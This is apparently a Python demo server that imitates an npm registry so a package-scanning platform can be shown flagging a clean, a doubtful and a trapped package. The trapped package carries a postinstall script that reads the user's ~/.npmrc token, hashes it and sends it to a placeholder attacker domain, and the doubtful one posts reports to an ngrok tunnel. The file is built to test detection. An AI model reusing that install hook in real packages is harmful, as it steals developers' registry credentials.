"""Faux registre npm de démo : la source amont npm (`SAS_NPM_URL`), le pendant de faux_pypi.py.

    python demo/paquets/faux_npm.py              # écoute sur 127.0.0.1:8082 (SAS_DEMO_PORT_NPM)
    export SAS_NPM_URL=http://127.0.0.1:8082     # côté plateforme, avant de lancer le web

Il sert l'API du registre npm (`/<nom>` et les archives) pour le trio de l'enregistrement vidéo, en
1.0.0 publiée il y a 400 jours (mûre tout de suite), et relaie tout autre nom vers
https://registry.npmjs.org (lecture seule). Un numéro de prise peut suivre le nom
(`demo-npm-piege-2`, 1 à 999) : même contenu, paquet jamais vu :
- `demo-npm-sain` : une fonction, rien d'autre : passe (vert) ;
- `demo-npm-a-revoir` : une fonction d'envoi de rapport vers un tunnel ngrok, jamais appelée : un
  seul signal FORT (`domaine_suspect`) : à revoir (orange) ;
- `demo-npm-piege` : un `postinstall` qui lit `~/.npmrc` (le jeton npm) et l'envoie : exfiltration
  en statique, leurre lu en sandbox : bloqué (rouge). Comme la 1.2 de faux_pypi.py, il n'envoie
  qu'une empreinte tronquée vers un domaine en `.invalid`, qui ne se résout jamais (RFC 2606).
  **Ne jamais l'installer hors de la sandbox quand même.**

Les archives sont construites en mémoire au démarrage (contenu fixe), jamais exécutées ici.
"""
import base64
import hashlib
import io
import json
import os
import re
import tarfile
from datetime import datetime, timedelta, timezone
from urllib.parse import quote

import httpx
from fastapi import FastAPI, HTTPException, Request
from fastapi.responses import Response

AMONT = os.environ.get("SAS_DEMO_AMONT_NPM", "https://registry.npmjs.org")
VERSION = "1.0.0"
EDITEUR = {"name": "equipe-demo", "email": "equipe@horodatage-demo.invalid"}

_SAIN = '''"use strict";
// Horodatage lisible pour les journaux.
function maintenant() {
  return new Date().toISOString().slice(0, 19) + "Z";
}
module.exports = { maintenant };
'''
_DOUTEUX = _SAIN.replace("module.exports = { maintenant };", '''
// Rapport de debug, envoyé seulement si l'appelant le demande.
const RAPPORT_URL = "https://horodatage-debug.ngrok-free.app/rapport";

function envoyerRapport(texte) {
  const req = require("https").request(RAPPORT_URL, { method: "POST" });
  req.end(texte);
}
module.exports = { maintenant, envoyerRapport };
''')
_POST = '''"use strict";
// --- ajouté par le compte repris (démo) ---
const fs = require("fs");
const os = require("os");
const crypto = require("crypto");
try {
  const d = fs.readFileSync(os.homedir() + "/.npmrc");
  const e = crypto.createHash("sha256").update(d).digest("hex").slice(0, 12);
  require("https").get("https://collecte.attaquant-demo.invalid/c?e=" + e).on("error", () => {});
} catch (_) {}
'''


def _package_json(nom: str, scripts: dict | None = None) -> str:
    pj = {"name": nom, "version": VERSION, "description": "Paquet de démo sas-pme",
          "main": "index.js", "license": "MIT"}
    if scripts:
        pj["scripts"] = scripts
    return json.dumps(pj, indent=2) + "\n"


FICHIERS = {
    "demo-npm-sain": {"package.json": _package_json("demo-npm-sain"), "index.js": _SAIN},
    "demo-npm-a-revoir": {"package.json": _package_json("demo-npm-a-revoir"), "index.js": _DOUTEUX},
    "demo-npm-piege": {"package.json": _package_json("demo-npm-piege",
                                                     {"postinstall": "node post.js"}),
                       "index.js": _SAIN, "post.js": _POST},
}


def _tgz(fichiers: dict[str, str]) -> bytes:
    tampon = io.BytesIO()
    with tarfile.open(fileobj=tampon, mode="w:gz") as t:
        for nom, texte in fichiers.items():
            donnees = texte.encode()
            info = tarfile.TarInfo(f"package/{nom}")
            info.size, info.mtime, info.mode = len(donnees), 1767225600, 0o644
            t.addfile(info, io.BytesIO(donnees))
    return tampon.getvalue()


# Un numéro de prise (1 à 999) peut suivre le nom : `demo-npm-piege-2` est un paquet jamais vu, au
# même contenu que `demo-npm-piege`. Chaque prise de la vidéo rejoue ainsi toute l'analyse.
_PRISE = re.compile(r"^(?P<base>" + "|".join(map(re.escape, FICHIERS)) + r")(-[1-9][0-9]{0,2})?$")


def du_trio(nom: str) -> str | None:
    m = _PRISE.match(nom)
    return m["base"] if m else None


def fichiers_de(nom: str) -> dict[str, str]:
    """Les fichiers d'un paquet du trio (ou d'une prise), `package.json` au nom demandé."""
    fichiers = dict(FICHIERS[du_trio(nom)])
    pj = json.loads(fichiers["package.json"])
    fichiers["package.json"] = json.dumps({**pj, "name": nom}, indent=2) + "\n"
    return fichiers


def construire() -> dict[str, bytes]:
    """{nom du paquet: archive .tgz} pour le trio sans numéro de prise."""
    return {nom: _tgz(fichiers_de(nom)) for nom in FICHIERS}


def _iso(d: datetime) -> str:
    return d.astimezone(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z")


def creer_app(amont: httpx.Client | None = None) -> FastAPI:
    archives = construire()
    publiee = _iso(datetime.now(timezone.utc) - timedelta(days=400))
    amont = amont or httpx.Client(timeout=30, follow_redirects=True)
    app = FastAPI(title="Faux registre npm de démo")

    def construite(nom: str) -> bool:
        """Vrai si `nom` est du trio ; son archive est alors construite (une fois)."""
        if du_trio(nom) is None:
            return False
        if nom not in archives:
            archives[nom] = _tgz(fichiers_de(nom))
        return True

    def document(request: Request, nom: str) -> dict:
        tgz = archives[nom]
        fichier = f"{nom}-{VERSION}.tgz"
        pj = json.loads(fichiers_de(nom)["package.json"])
        dist = {"tarball": f"{str(request.base_url).rstrip('/')}/{nom}/-/{fichier}",
                "shasum": hashlib.sha1(tgz).hexdigest(),
                "integrity": "sha512-" + base64.b64encode(hashlib.sha512(tgz).digest()).decode()}
        return {"_id": nom, "name": nom, "dist-tags": {"latest": VERSION},
                "versions": {VERSION: {**pj, "_id": f"{nom}@{VERSION}", "dependencies": {},
                                       "_npmUser": EDITEUR, "dist": dist}},
                "time": {"created": publiee, "modified": publiee, VERSION: publiee}}

    @app.get("/{nom}/-/{fichier}")
    def archive(nom: str, fichier: str):
        if not construite(nom) or fichier != f"{nom}-{VERSION}.tgz":
            raise HTTPException(404)
        return Response(archives[nom], media_type="application/octet-stream")

    @app.get("/{chemin:path}")
    def paquet(chemin: str, request: Request):
        if construite(chemin):
            return document(request, chemin)
        r = amont.get(f"{AMONT}/{quote(chemin, safe='@/')}")
        return Response(r.content, status_code=r.status_code, media_type="application/json")

    return app


if __name__ == "__main__":
    import uvicorn

    uvicorn.run(creer_app(), host="127.0.0.1", port=int(os.environ.get("SAS_DEMO_PORT_NPM", "8082")))
